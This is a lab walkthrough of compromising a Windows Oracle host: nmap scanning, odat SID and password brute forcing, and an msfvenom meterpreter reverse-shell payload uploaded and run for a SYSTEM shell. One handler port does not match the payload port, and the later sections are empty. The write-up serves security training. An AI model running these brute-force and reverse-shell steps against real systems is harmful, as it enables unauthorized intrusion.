
## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: Brute Forcing Oracle Login & RCE via Oracle
- Privilege escalation:

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.95.188 -sC -sV -A -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 01:52 EDT
Nmap scan report for 10.129.95.188
Host is up (0.0030s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
- Identified running `oracle db` on target
## Foothold

#### Steps
- Perform SID brute forcing using `odat`
```
$ odat sidguesser -s 10.129.95.188 -p 1521

[1] (10.129.95.188:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID. Continue...                       #####################################################################################################################################################################   | ETA:  00:00:02
100% |#############################################################################################################################################################################################################################| Time: 00:04:07
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
100% |#############################################################################################################################################################################################################################| Time: 00:00:07
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)
[+] 'XE' is a valid SID. Continue...                       ###############################################################################################################################################                         | ETA:  00:00:24
100% |#############################################################################################################################################################################################################################| Time: 00:03:50
[+] SIDs found on the 10.129.95.188:1521 server: XE

```
- After Identified the SID we can attempt to perform user and password brute forcing 
- First make a copy of `oracle_default_userpass.txt`
```
$ cp /usr/share/wordlists/metasploit/oracle_default_userpass.txt ~/demo/user_pass.txt
```
- Replace the space between user and password with `/`
```
awk '{print $1 "/" $2}' user_pass.txt > updated_user_pass.txt
```
- Brute force for valid credential using `odat`
```
$ sudo odat passwordguesser -s 10.129.95.188 -p 1521 -d XE --accounts-file ~/demo/updated_user_pass.txt
[sudo] password for kali:

[1] (10.129.95.188:1521): Searching valid accounts on the 10.129.95.188 server, port 1521
[+] Valid credentials found: scott/tiger. Continue...
```
- Once we have recovered a valid login we can attempt to upload a reverse shell payload and execute for RCE
- Generate a stageless RCE payload using `msfvenom`
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f exe -o stageless_reverse.exe
```
- Upload the paylod to target using `odat`
```bash
$ sudo odat utlfile -s 10.129.95.188 -p 1521 -U scott -P tiger -d XE --sysdba \
  --putFile "C:\\" stageless_reverse.exe /home/kali/Downloads/tools/stageless_reverse.exe

[1] (10.129.95.188:1521): Put the /home/kali/Downloads/tools/stageless_reverse.exe local file in the C:\ folder like stageless_reverse.exe on the 10.129.95.188 server
[+] The /home/kali/Downloads/tools/stageless_reverse.exe file was created on the C:\ directory on the 10.129.95.188 server like the stageless_reverse.exe file
```
- Set up `msfconsole`  to listen for connection 
```
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.37
set LPORT 5555
run
```
- Execute the payload 
```
$ sudo odat externaltable -s 10.129.95.188 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ stageless_reverse.exe

[1] (10.129.95.188:1521): Execute the stageless_reverse.exe command stored in the c:/ path
```
- We get a connection back on `msfconsole`
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.37:4444
[*] Meterpreter session 1 opened (10.10.14.37:4444 -> 10.129.95.188:49163) at 2026-06-07 23:47:37 -0700

meterpreter > shell
Process 1732 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
whoami
nt authority\system
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps


## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: